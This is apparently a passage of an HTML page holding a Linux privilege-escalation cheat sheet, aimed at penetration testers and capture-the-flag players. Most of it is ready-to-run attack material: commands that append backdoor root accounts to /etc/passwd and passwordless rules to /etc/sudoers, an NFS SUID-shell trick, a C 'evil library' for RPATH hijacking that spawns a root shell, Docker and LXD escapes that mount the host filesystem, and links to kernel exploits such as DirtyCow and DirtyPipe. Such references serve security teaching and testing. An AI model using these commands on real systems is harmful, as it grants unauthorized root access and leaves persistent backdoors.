+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>openssl passwd <span style="color:#ae81ff">-1</span> -salt hacker hacker
+</span></span><span style="display:flex;"><span>mkpasswd -m SHA-<span style="color:#ae81ff">512</span> hacker
+</span></span><span style="display:flex;"><span>python2 -c <span style="color:#e6db74">&#39;import crypt; print crypt.crypt(&#34;hacker&#34;, &#34;$6$salt&#34;)&#39;</span>
+</span></span></code></pre></div><p>Then add the user <code>hacker</code> and add the generated password.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>hacker<span style="color:#960050;background-color:#1e0010">:</span>GENERATED_PASSWORD_HERE<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">:</span>Hacker<span style="color:#960050;background-color:#1e0010">:</span>/root<span style="color:#960050;background-color:#1e0010">:</span>/bin/bash
+</span></span></code></pre></div><p>E.g: <code>hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash</code></p>
+<p>You can now use the <code>su</code> command with <code>hacker:hacker</code></p>
+<p>Alternatively you can use the following lines to add a dummy user without a password. <br>
+WARNING: you might degrade the current security of the machine.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;dummy::0:0::/root:/bin/bash&#39;</span> &gt;&gt;/etc/passwd
+</span></span><span style="display:flex;"><span>su - dummy
+</span></span></code></pre></div><p>NOTE: In BSD platforms <code>/etc/passwd</code> is located at <code>/etc/pwd.db</code> and <code>/etc/master.passwd</code>, also the <code>/etc/shadow</code> is renamed to <code>/etc/spwd.db</code>.</p>
+<h3 id="writable-etcsudoers">
+  Writable /etc/sudoers
+  <a class="anchor" href="#writable-etcsudoers">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;username ALL=(ALL:ALL) ALL&#34;</span>&gt;&gt;/etc/sudoers
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># use SUDO without password</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;username ALL=(ALL) NOPASSWD: ALL&#34;</span> &gt;&gt;/etc/sudoers
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;username ALL=NOPASSWD: /bin/bash&#34;</span> &gt;&gt;/etc/sudoers
+</span></span></code></pre></div><h2 id="nfs-root-squashing">
+  NFS Root Squashing
+  <a class="anchor" href="#nfs-root-squashing">#</a>
+</h2>
+<p>When <strong>no_root_squash</strong> appears in <code>/etc/exports</code>, the folder is shareable and a remote user can mount it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># remote check the name of the folder</span>
+</span></span><span style="display:flex;"><span>showmount -e <span style="color:#ae81ff">10.10</span>.10.10
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># create dir</span>
+</span></span><span style="display:flex;"><span>mkdir /tmp/nfsdir  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># mount directory </span>
+</span></span><span style="display:flex;"><span>mount -t nfs <span style="color:#ae81ff">10.10</span>.10.<span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">:</span>/shared /tmp/nfsdir    
+</span></span><span style="display:flex;"><span>cd /tmp/nfsdir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># copy wanted shell </span>
+</span></span><span style="display:flex;"><span>cp /bin/bash . 	
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># set suid permission</span>
+</span></span><span style="display:flex;"><span>chmod +s bash 	
+</span></span></code></pre></div><h2 id="shared-library">
+  Shared Library
+  <a class="anchor" href="#shared-library">#</a>
+</h2>
+<h3 id="ldconfig">
+  ldconfig
+  <a class="anchor" href="#ldconfig">#</a>
+</h3>
+<p>Identify shared libraries with <code>ldd</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ ldd /opt/binary
+</span></span><span style="display:flex;"><span>    linux-vdso.so.1 (0x00007ffe961cd000)
+</span></span><span style="display:flex;"><span>    vulnlib.so.8 =&gt; /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)
+</span></span><span style="display:flex;"><span>    /lib64/ld-linux-x86-<span style="color:#ae81ff">64</span>.so.2 =&gt; /usr/lib64/ld-linux-x86-<span style="color:#ae81ff">64</span>.so.2 (0x00007fa55e6c8000)        
+</span></span></code></pre></div><p>Create a library in <code>/tmp</code> and activate the path.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>gcc <span style="color:#960050;background-color:#1e0010">–</span>Wall <span style="color:#960050;background-color:#1e0010">–</span>fPIC <span style="color:#960050;background-color:#1e0010">–</span>shared <span style="color:#960050;background-color:#1e0010">–</span>o vulnlib.so /tmp/vulnlib.c
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;/tmp/&#34;</span> &gt; /etc/ld.so.conf.d/exploit.conf &amp;&amp; ldconfig -l /tmp/vulnlib.so
+</span></span><span style="display:flex;"><span>/opt/binary
+</span></span></code></pre></div><h3 id="rpath">
+  RPATH
+  <a class="anchor" href="#rpath">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>level15@nebula<span style="color:#960050;background-color:#1e0010">:</span>/home/flag15$ readelf -d flag15 | egrep <span style="color:#e6db74">&#34;NEEDED|RPATH&#34;</span>
+</span></span><span style="display:flex;"><span> 0x00000001 (NEEDED)                     Shared library<span style="color:#960050;background-color:#1e0010">:</span> [<span style="color:#66d9ef">libc.so.6</span>]
+</span></span><span style="display:flex;"><span> 0x0000000f (RPATH)                      Library rpath<span style="color:#960050;background-color:#1e0010">:</span> [/var/tmp/flag15]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>level15@nebula<span style="color:#960050;background-color:#1e0010">:</span>/home/flag15$ ldd ./flag15 
+</span></span><span style="display:flex;"><span> linux-gate.so.1 =&gt;  (0x0068c000)
+</span></span><span style="display:flex;"><span> libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x00110000)
+</span></span><span style="display:flex;"><span> /lib/ld-linux.so.2 (0x005bb000)
+</span></span></code></pre></div><p>By copying the lib into <code>/var/tmp/flag15/</code> it will be used by the program in this place as specified in the <code>RPATH</code> variable.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>level15@nebula<span style="color:#960050;background-color:#1e0010">:</span>/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>level15@nebula<span style="color:#960050;background-color:#1e0010">:</span>/home/flag15$ ldd ./flag15 
+</span></span><span style="display:flex;"><span> linux-gate.so.1 =&gt;  (0x005b0000)
+</span></span><span style="display:flex;"><span> libc.so.6 =&gt; /var/tmp/flag15/libc.so.6 (0x00110000)
+</span></span><span style="display:flex;"><span> /lib/ld-linux.so.2 (0x00737000)
+</span></span></code></pre></div><p>Then create an evil library in <code>/var/tmp</code> with <code>gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e">#include&lt;stdlib.h&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define SHELL &#34;/bin/sh&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span> char *file = SHELL;
+</span></span><span style="display:flex;"><span> char *argv[] = {SHELL,<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span> setresuid(geteuid(),geteuid(), geteuid());
+</span></span><span style="display:flex;"><span> execve(file,argv,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="groups">
+  Groups
+  <a class="anchor" href="#groups">#</a>
+</h2>
+<h3 id="docker">
+  Docker
+  <a class="anchor" href="#docker">#</a>
+</h3>
+<p>Mount the filesystem in a bash container, allowing you to edit the <code>/etc/passwd</code> as root, then add a backdoor account <code>toor:password</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$&gt; docker run -it --rm -v $PWD:/mnt bash
+</span></span><span style="display:flex;"><span>$&gt; echo <span style="color:#e6db74">&#39;toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh&#39;</span> &gt;&gt; /mnt/etc/passwd
+</span></span></code></pre></div><p>Almost similar but you will also see all processes running on the host and be connected to the same NICs.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>docker run --rm -it --pid=host --net=host --privileged -v /<span style="color:#960050;background-color:#1e0010">:</span>/host ubuntu bash
+</span></span></code></pre></div><p>Or use the following docker image from 
+  <a href="https://hub.docker.com/r/chrisfosterelli/rootplease/">chrisfosterelli</a> to spawn a root shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$ docker run -v /<span style="color:#960050;background-color:#1e0010">:</span>/hostOS -i -t chrisfosterelli/rootplease
+</span></span><span style="display:flex;"><span>latest<span style="color:#960050;background-color:#1e0010">:</span> Pulling from chrisfosterelli/rootplease
+</span></span><span style="display:flex;"><span>2de59b831a23<span style="color:#960050;background-color:#1e0010">:</span> Pull complete 
+</span></span><span style="display:flex;"><span>354c3661655e<span style="color:#960050;background-color:#1e0010">:</span> Pull complete 
+</span></span><span style="display:flex;"><span>91930878a2d7<span style="color:#960050;background-color:#1e0010">:</span> Pull complete 
+</span></span><span style="display:flex;"><span>a3ed95caeb02<span style="color:#960050;background-color:#1e0010">:</span> Pull complete 
+</span></span><span style="display:flex;"><span>489b110c54dc<span style="color:#960050;background-color:#1e0010">:</span> Pull complete 
+</span></span><span style="display:flex;"><span>Digest<span style="color:#960050;background-color:#1e0010">:</span> sha256<span style="color:#960050;background-color:#1e0010">:</span>07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0
+</span></span><span style="display:flex;"><span>Status<span style="color:#960050;background-color:#1e0010">:</span> Downloaded newer image <span style="color:#66d9ef">for</span> chrisfosterelli/rootplease<span style="color:#960050;background-color:#1e0010">:</span>latest
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>You should now have a root shell on the host OS
+</span></span><span style="display:flex;"><span>Press Ctrl-D to exit the docker instance / shell
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sh-<span style="color:#ae81ff">5.0</span><span style="color:#75715e"># id</span>
+</span></span><span style="display:flex;"><span>uid=<span style="color:#ae81ff">0</span>(root) gid=<span style="color:#ae81ff">0</span>(root) groups=<span style="color:#ae81ff">0</span>(root)
+</span></span></code></pre></div><p>More docker privilege escalation using the Docker Socket.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>sudo docker -H unix<span style="color:#960050;background-color:#1e0010">:</span>///google/host/var/run/docker.sock run -v /<span style="color:#960050;background-color:#1e0010">:</span>/host -it ubuntu chroot /host /bin/bash
+</span></span><span style="display:flex;"><span>sudo docker -H unix<span style="color:#960050;background-color:#1e0010">:</span>///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t <span style="color:#ae81ff">1</span> -m -u -n -i sh
+</span></span></code></pre></div><h3 id="lxclxd">
+  LXC/LXD
+  <a class="anchor" href="#lxclxd">#</a>
+</h3>
+<p>The privesc requires to run a container with elevated privileges and mount the host filesystem inside.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╭─</span>swissky@lab ~  
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╰─</span>$ id
+</span></span><span style="display:flex;"><span>uid=<span style="color:#ae81ff">1000</span>(swissky) gid=<span style="color:#ae81ff">1000</span>(swissky) groupes=<span style="color:#ae81ff">1000</span>(swissky),<span style="color:#ae81ff">3</span>(sys),<span style="color:#ae81ff">90</span>(network),<span style="color:#ae81ff">98</span>(power),<span style="color:#ae81ff">110</span>(lxd),<span style="color:#ae81ff">991</span>(lp),<span style="color:#ae81ff">998</span>(wheel)
+</span></span></code></pre></div><p>Build an Alpine image and start it using the flag <code>security.privileged=true</code>, forcing the container to interact as root with the host filesystem.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># build a simple alpine image</span>
+</span></span><span style="display:flex;"><span>git clone https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/saghul/lxd-alpine-builder
+</span></span><span style="display:flex;"><span>./build-alpine -a i686
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># import the image</span>
+</span></span><span style="display:flex;"><span>lxc image import ./alpine.tar.gz --alias myimage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># run the image</span>
+</span></span><span style="display:flex;"><span>lxc init myimage mycontainer -c security.privileged=true
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># mount the /root into the image</span>
+</span></span><span style="display:flex;"><span>lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># interact with the container</span>
+</span></span><span style="display:flex;"><span>lxc start mycontainer
+</span></span><span style="display:flex;"><span>lxc exec mycontainer /bin/sh
+</span></span></code></pre></div><p>Alternatively 
+  <a href="https://github.com/initstring/lxd_root">https://github.com/initstring/lxd_root</a></p>
+<h2 id="hijack-tmux-session">
+  Hijack TMUX session
+  <a class="anchor" href="#hijack-tmux-session">#</a>
+</h2>
+<p>Require a read access to the tmux socket : <code>/tmp/tmux-1000/default</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>export TMUX=/tmp/tmux-<span style="color:#ae81ff">1000</span>/<span style="color:#66d9ef">default</span>,<span style="color:#ae81ff">1234</span>,<span style="color:#ae81ff">0</span> 
+</span></span><span style="display:flex;"><span>tmux ls
+</span></span></code></pre></div><h2 id="kernel-exploits">
+  Kernel Exploits
+  <a class="anchor" href="#kernel-exploits">#</a>
+</h2>
+<p>Precompiled exploits can be found inside these repositories, run them at your own risk !</p>
+<ul>
+<li>
+  <a href="https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits">bin-sploits - @offensive-security</a></li>
+<li>
+  <a href="https://github.com/lucyoa/kernel-exploits/">kernel-exploits - @lucyoa</a></li>
+</ul>
+<p>The following exploits are known to work well, search for more exploits with <code>searchsploit -w linux kernel centos</code>.</p>
+<p>Another way to find a kernel exploit is to get the specific kernel version and linux distro of the machine by doing <code>uname -a</code>
+Copy the kernel version and distribution, and search for it in google or in 
+  <a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a>.</p>
+<h3 id="cve-2022-0847-dirtypipe">
+  CVE-2022-0847 (DirtyPipe)
+  <a class="anchor" href="#cve-2022-0847-dirtypipe">#</a>
+</h3>
+<p>Linux Privilege Escalation - Linux Kernel 5.8 &lt; 5.16.11</p>
+<pre tabindex="0"><code>https://www.exploit-db.com/exploits/50808
+</code></pre><h3 id="cve-2016-5195-dirtycow">
+  CVE-2016-5195 (DirtyCow)
+  <a class="anchor" href="#cve-2016-5195-dirtycow">#</a>
+</h3>
+<p>Linux Privilege Escalation - Linux Kernel &lt;= 3.19.0-73.8</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># make dirtycow stable</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#ae81ff">0</span> &gt; /proc/sys/vm/dirty_writeback_centisecs
+</span></span><span style="display:flex;"><span>g++ -Wall -pedantic -O2 -std=c+<span style="color:#ae81ff">+11</span> -pthread -o dcow <span style="color:#ae81ff">40847</span>.cpp -lutil
+</span></span><span style="display:flex;"><span>https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/dirtycow/dirtycow.github.io/wiki/PoCs
+</span></span><span style="display:flex;"><span>https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/evait-security/ClickNRoot/blob/master/<span style="color:#ae81ff">1</span>/exploit.c
+</span></span></code></pre></div><h3 id="cve-2010-3904-rds">
+  CVE-2010-3904 (RDS)
+  <a class="anchor" href="#cve-2010-3904-rds">#</a>
+</h3>
+<p>Linux RDS Exploit - Linux Kernel &lt;= 2.6.36-rc8</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>https<span style="color:#960050;background-color:#1e0010">:</span>//www.exploit-db.com/exploits/<span style="color:#ae81ff">15285</span>/
+</span></span></code></pre></div><h3 id="cve-2010-4258-full-nelson">
+  CVE-2010-4258 (Full Nelson)
+  <a class="anchor" href="#cve-2010-4258-full-nelson">#</a>
+</h3>
+<p>Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>https<span style="color:#960050;background-color:#1e0010">:</span>//www.exploit-db.com/exploits/<span style="color:#ae81ff">15704</span>/
+</span></span></code></pre></div><h3 id="cve-2012-0056-mempodipper">
+  CVE-2012-0056 (Mempodipper)
+  <a class="anchor" href="#cve-2012-0056-mempodipper">#</a>
+</h3>
+<p>Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>https<span style="color:#960050;background-color:#1e0010">:</span>//www.exploit-db.com/exploits/<span style="color:#ae81ff">18411</span>
+</span></span></code></pre></div><h2 id="references">
+  References
+  <a class="anchor" href="#references">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://mn3m.info/posts/suid-vs-capabilities/">SUID vs Capabilities - Dec 7, 2017 - Nick Void aka mn3m</a></li>
+<li>
+  <a href="https://fosterelli.co/privilege-escalation-via-docker.html">Privilege escalation via Docker - April 22, 2015 - Chris Foster</a></li>
+<li>
+  <a href="https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/">An Interesting Privilege Escalation vector (getcap/setcap) - NXNJZ - AUGUST 21, 2018</a></li>
+<li>
+  <a href="https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/">Exploiting wildcards on Linux - Berislav Kucan</a></li>
+<li>
+  <a href="http://p4pentest.in/2016/10/19/code-execution-with-tar-command/">Code Execution With Tar Command - p4pentest</a></li>
+<li>
+  <a href="http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">Back To The Future: Unix Wildcards Gone Wild - Leon Juranic</a></li>
+<li>
+  <a href="https://www.securitynewspaper.com/2018/04/25/use-weak-nfs-permissions-escalate-linux-privileges/">HOW TO EXPLOIT WEAK NFS PERMISSIONS THROUGH PRIVILEGE ESCALATION? - APRIL 25, 2018</a></li>
+<li>
+  <a href="https://reboare.github.io/lxd/lxd-escape.html">Privilege Escalation via lxd - @reboare</a></li>
+<li>
+  <a href="https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/">Editing /etc/passwd File for Privilege Escalation - Raj Chandel - MAY 12, 2018</a></li>
+<li>
+  <a href="https://github.com/nongiach/sudo_inject">Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc</a></li>
+</ul>
+<ul>
+<li>
+  <a href="http://www.deer-run.com/~hal/sysadmin/pam_cracklib.html">Linux Password Security with pam_cracklib - Hal Pomeranz, Deer Run Associates</a></li>
+<li>
+  <a href="https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf">Local Privilege Escalation Workshop - Slides.pdf - @sagishahar</a></li>
+<li>
+  <a href="https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/SSH/key-exploit.md">SSH Key Predictable PRNG (Authorized_Keys) Process - @weaknetlabs</a></li>
+<li>
+  <a href="https://dirtypipe.cm4all.com/">The Dirty Pipe Vulnerability</a></li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+
+
+
+  <div>
+    <a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/edit/main/exampleSite/content.en/docs/linux_privilege_escalation.md" target="_blank" rel="noopener">
+      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
+      <span>Edit this page</span>
+    </a>
+  </div>
+
+
+</div>
+
+
+
+  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+
+
+ 
+        
+      </footer>
+
+      
+  
+ 
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+    <aside class="book-toc">
+      <div class="book-toc-content">
+        
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#linux---privilege-escalation">Linux - Privilege Escalation</a>
+      <ul>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#checklists">Checklists</a></li>
+        <li><a href="#looting-for-passwords">Looting for passwords</a>
+          <ul>
+            <li><a href="#files-containing-passwords">Files containing passwords</a></li>
+            <li><a href="#old-passwords-in-etcsecurityopasswd">Old passwords in /etc/security/opasswd</a></li>
+            <li><a href="#last-edited-files">Last edited files</a></li>
+            <li><a href="#in-memory-passwords">In memory passwords</a></li>
+            <li><a href="#find-sensitive-files">Find sensitive files</a></li>
+          </ul>
+        </li>
+        <li><a href="#ssh-key">SSH Key</a>
+          <ul>
+            <li><a href="#sensitive-files">Sensitive files</a></li>
+            <li><a href="#ssh-key-predictable-prng-authorized_keys-process">SSH Key Predictable PRNG (Authorized_Keys) Process</a></li>
+          </ul>
+        </li>
+        <li><a href="#scheduled-tasks">Scheduled tasks</a>
+          <ul>
+            <li><a href="#cron-jobs">Cron jobs</a></li>
+          </ul>
+        </li>
+        <li><a href="#systemd-timers">Systemd timers</a></li>
+        <li><a href="#suid">SUID</a>
+          <ul>
+            <li><a href="#find-suid-binaries">Find SUID binaries</a></li>
+            <li><a href="#create-a-suid-binary">Create a SUID binary</a></li>
+          </ul>
+        </li>
+        <li><a href="#capabilities">Capabilities</a>
+          <ul>
+            <li><a href="#list-capabilities-of-binaries">List capabilities of binaries</a></li>
+            <li><a href="#edit-capabilities">Edit capabilities</a></li>
+            <li><a href="#interesting-capabilities">Interesting capabilities</a></li>
+          </ul>
+        </li>
+        <li><a href="#sudo">SUDO</a>
+          <ul>
+            <li><a href="#nopasswd">NOPASSWD</a></li>
+            <li><a href="#ld_preload-and-nopasswd">LD_PRELOAD and NOPASSWD</a></li>
+            <li><a href="#doas">Doas</a></li>
+            <li><a href="#sudo_inject">sudo_inject</a></li>
+            <li><a href="#cve-2019-14287">CVE-2019-14287</a></li>
+          </ul>
+        </li>
+        <li><a href="#gtfobins">GTFOBins</a></li>
+        <li><a href="#wildcard">Wildcard</a></li>
+        <li><a href="#writable-files">Writable files</a>
+          <ul>
+            <li><a href="#writable-etcsysconfignetwork-scripts-centosredhat">Writable /etc/sysconfig/network-scripts/ (Centos/Redhat)</a></li>
+            <li><a href="#writable-etcpasswd">Writable /etc/passwd</a></li>
+            <li><a href="#writable-etcsudoers">Writable /etc/sudoers</a></li>
+          </ul>
+        </li>
+        <li><a href="#nfs-root-squashing">NFS Root Squashing</a></li>
+        <li><a href="#shared-library">Shared Library</a>
+          <ul>
+            <li><a href="#ldconfig">ldconfig</a></li>
+            <li><a href="#rpath">RPATH</a></li>
+          </ul>
+        </li>
+        <li><a href="#groups">Groups</a>
+          <ul>
+            <li><a href="#docker">Docker</a></li>
+            <li><a href="#lxclxd">LXC/LXD</a></li>
+          </ul>
+        </li>
+        <li><a href="#hijack-tmux-session">Hijack TMUX session</a></li>
+        <li><a href="#kernel-exploits">Kernel Exploits</a>
+          <ul>
+            <li><a href="#cve-2022-0847-dirtypipe">CVE-2022-0847 (DirtyPipe)</a></li>
+            <li><a href="#cve-2016-5195-dirtycow">CVE-2016-5195 (DirtyCow)</a></li>
+            <li><a href="#cve-2010-3904-rds">CVE-2010-3904 (RDS)</a></li>
+            <li><a href="#cve-2010-4258-full-nelson">CVE-2010-4258 (Full Nelson)</a></li>
+            <li><a href="#cve-2012-0056-mempodipper">CVE-2012-0056 (Mempodipper)</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
